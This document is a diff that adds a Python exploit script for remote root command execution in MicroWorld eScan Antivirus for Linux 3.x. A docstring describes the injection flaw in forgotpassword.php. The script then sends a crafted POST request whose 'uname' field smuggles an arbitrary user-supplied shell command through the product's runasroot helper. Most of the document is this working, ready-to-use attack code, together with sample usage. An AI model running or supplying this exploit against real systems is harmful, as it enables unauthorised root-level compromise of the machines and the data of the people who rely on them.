@@ -1,0 +1,70 @@
+#!/usr/bin/env python
+import sys
+from socket import *
+
+#auther: Mohammed almutairi
+#(Sa.attacker@gmail.com)
+"""
+MicroWorld eScan Antivirus < 3.x  Remote Root Command Execution
+Package MWADMIN package vulnerabilities (linux)
+The Base Packages (MWADMIN and MWAV) must be installed before eScan
+Link:
+http://www.escanav.com/english/content/products/escan_linux/linux_products.asp
+infcted: aLL version 3.X eScan linux
+1-Escan for Linux Desktop
+2-Escan for Linux file Servers
+3-MailScan for Linux and webscan
+Tested On RedHat  and Fedora
+ULTRA PRIV8 :)
+
+Description:
+
+From /opt/MicroWorld/var/www/htdocs/forgotpassword.php:
+include("common_functions.php");  <---> (1)
+
+if ($_POST['forgot'] == "Send Password")
+{
+        $user = $_POST["uname"]; <--->(2) insecure:(
+
+
+vulnerable code in forgotpassword.php and common_functions.php 
+in (1) $runasroot = "/opt/MicroWorld/sbin/runasroot";
+we can injection through via the file forgotpassword.php As you can see (2)
+with  remote root Command Execution
+>> eScan.py www.***.com
+eScan@/bin/sh:$Sa$ => reboot
+[*] Done! sent to: www.***.com
+"""
+
+def xpl():
+	if len(sys.argv) < 2:
+                print "[*] MicroWorld eScan Antivirus Remote Root Command Execution"
+                print "[*] exploited by Mohammed almutairi"
+		print "[*] usage: %s host" % sys.argv[0]
+		return
+
+	host = sys.argv[1]
+	port = 10080 # default port
+	cmd = raw_input("eScan@/bin/sh:$Sa$ => ")
+	sock=socket(AF_INET, SOCK_STREAM)
+	sock.connect((host,port))
+        sh="/opt/MicroWorld/sbin/runasroot /bin/sh -c '%s'" % cmd
+
+        sa= "uname=;%s;" %sh # (;sh;)  ---> Here Play See to ^(2)^
+        sa+= "&forgot=Send+Password"
+        
+        s="POST /forgotpassword.php HTTP/1.1\r\n"
+        s+="Host: %s:%d\r\n"%(host, port)
+        s+="User-Agent: */*\r\n"
+        s+="Accept: ar,en-us;q=0.7,en;q=0.3\r\n"
+        s+="Content-Type: application/x-www-form-urlencoded\r\n"
+        s+="Content-Length: %d \r\n\r\n"%len(sa)
+        s+=sa
+
+	sock.sendall(s)
+	print "[*] Done! sent to: %s" % host
+	sock.close()
+
+if __name__=="__main__":
+        xpl()
+	sys.exit(0)
